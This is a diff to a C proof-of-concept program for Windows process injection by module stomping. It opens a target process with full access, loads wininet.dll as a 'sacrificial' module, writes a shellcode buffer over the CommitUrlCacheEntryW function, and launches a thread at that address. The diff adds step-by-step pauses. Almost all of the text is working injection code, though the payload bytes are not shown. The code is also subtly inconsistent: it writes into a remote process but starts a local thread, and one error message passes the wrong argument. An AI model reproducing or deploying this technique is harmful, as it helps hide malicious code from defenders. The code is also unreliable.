@@ -40,13 +40,16 @@ int main() {
 
     printf("[*] Running PI with target PID: %u\n", pid);
 
-    // Open a handle to the current process, this must be passed to VirtualAllocEx
+    // Open a handle to the current process
     HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
     if(pHandle == NULL) {
         printf("Failed to acquire process handle!\n");
         return -1;
     }
     printf("[*] Successfully opened handle to PID: %u\n", pid);
+
+    printf("[*] Press Enter to load the sacrificial DLL:");
+    getchar();
 
     // load sacrificial DLL, using wininet because it is fairly large and so it can accomodate different PoC payloads
     HMODULE hSacrificialDll = LoadLibraryExA("wininet.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
@@ -56,23 +59,29 @@ int main() {
     }
     printf("[*] Target DLL loaded.\n");
     
-    LPVOID bufferAddress = (LPVOID)GetProcAddress(hSacrificialDll, "CommitUrlCacheEntryW");  
-    if (bufferAddress == NULL) {
+    LPVOID targetAddress = (LPVOID)GetProcAddress(hSacrificialDll, "CommitUrlCacheEntryW");  
+    if (targetAddress == NULL) {
         printf("[ERROR] Failed to locate target function CommitUrlCacheEntryW! Error: %lu\n", pid, GetLastError());
         return -1;
     }
-    printf("[*] Target wininet.dll!CommitUrlCacheEntryW located at: : 0x%016llx\n", bufferAddress);
+    printf("[*] Target wininet.dll!CommitUrlCacheEntryW located at: 0x%016llx\n", targetAddress);
+
+    printf("[*] Press Enter to write the shellcode:");
+    getchar();
 
     // Write the shellcode to the block of memory that we located with GetProcAddress
-    BOOL writeShellcode = WriteProcessMemory(pHandle, bufferAddress, buf, sizeof buf, NULL);
+    BOOL writeShellcode = WriteProcessMemory(pHandle, targetAddress, buf, sizeof buf, NULL);
     if(writeShellcode == false) {
-        printf("[ERROR] Failed to write shellcode! Using addresss: 0x%016llx, Error: %lu\n", bufferAddress, GetLastError());
+        printf("[ERROR] Failed to write shellcode! Using addresss: 0x%016llx, Error: %lu\n", targetAddress, GetLastError());
         FreeLibrary(hSacrificialDll);
         return -1;
     }
 
+    printf("[*] Press Enter to execute the shellcode:");
+    getchar();
+
     // Create a new thread using the shellcode buffer address as the starting point
-    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)bufferAddress, NULL, 0, NULL);
+    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)targetAddress, NULL, 0, NULL);
     if (tHandle == NULL) {
         printf("[ERROR] Failed to create thread within the process (PID: %u)! Error: %lu\n", pid, GetLastError());
         FreeLibrary(hSacrificialDll);
